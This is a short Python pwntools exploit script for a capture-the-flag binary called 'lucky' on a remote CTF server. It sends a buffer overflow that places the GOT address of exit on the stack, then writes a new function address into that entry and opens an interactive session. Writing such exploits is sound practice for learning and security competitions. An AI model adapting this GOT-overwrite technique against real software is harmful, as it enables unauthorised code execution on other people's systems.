#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft
import pwnlib
import time

pwn_file = "./lucky"
elf = ELF(pwn_file)
context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

context.log_level = 100
context.log_level = 'debug'

# c = process(pwn_file)
dbg_script = """
b *0x4005a0 
"""
# gdb.attach(c,dbg_script)
c = remote('ctf.adl.tw', '11003')
c.sendlineafter(' ?', b'a' * (48 - 8) + p64(elf.got['exit']))
c.sendlineafter('s $100) :', str(0x04008f1))
c.sendlineafter('ber (0-999) :', '321')
c.interactive()
c.close()

